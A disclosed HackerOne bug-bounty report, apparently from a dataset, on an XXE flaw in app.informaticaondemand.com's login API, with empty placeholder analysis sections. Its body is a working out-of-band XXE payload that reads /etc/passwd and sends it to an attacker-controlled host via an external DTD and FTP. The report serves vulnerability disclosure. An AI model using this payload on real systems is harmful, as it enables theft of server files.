---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '105753'
original_report_id: '105753'
title: '[app.informaticaondemand.com] XXE'
weakness: Uncontrolled Resource Consumption
team_handle: informatica
created_at: '2015-12-17T10:57:14.283Z'
disclosed_at: '2017-04-08T10:07:19.915Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 24
tags:
- hackerone
- uncontrolled-resource-consumption
---

# [app.informaticaondemand.com] XXE

## Metadata

- HackerOne Report ID: 105753
- Weakness: Uncontrolled Resource Consumption
- Program: informatica
- Disclosed At: 2017-04-08T10:07:19.915Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Request:
POST /ma/api/v2/user/login HTTP/1.1
Host: app.informaticaondemand.com
Content-Length: 285
Content-Type: application/xml
Accept: application/xml

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % b PUBLIC "lol" "file:///etc/passwd">
<!ENTITY % asd PUBLIC "lol" "http://mysite/xx.html">
%asd;
%rrr;]>
<login><username>demo@informatica.com</username><password>Infa123</password></login>

Where xx.html:
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://mysite/%b;'>">%c;

Then i got file /etc/passwd (xxe_app.png)

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
